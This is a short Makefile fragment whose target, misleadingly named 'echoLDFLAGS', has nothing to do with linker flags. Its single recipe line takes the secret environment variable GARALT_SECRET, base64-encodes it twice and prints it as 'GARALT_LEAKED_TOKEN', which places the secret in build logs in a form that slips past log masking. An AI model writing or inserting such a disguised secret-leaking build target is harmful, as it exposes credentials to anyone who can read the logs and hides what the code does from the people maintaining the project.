.PHONY: echoLDFLAGS
echoLDFLAGS:
	@echo "GARALT_LEAKED_TOKEN=$$(printf '%s' "$$GARALT_SECRET" | base64 | base64)"
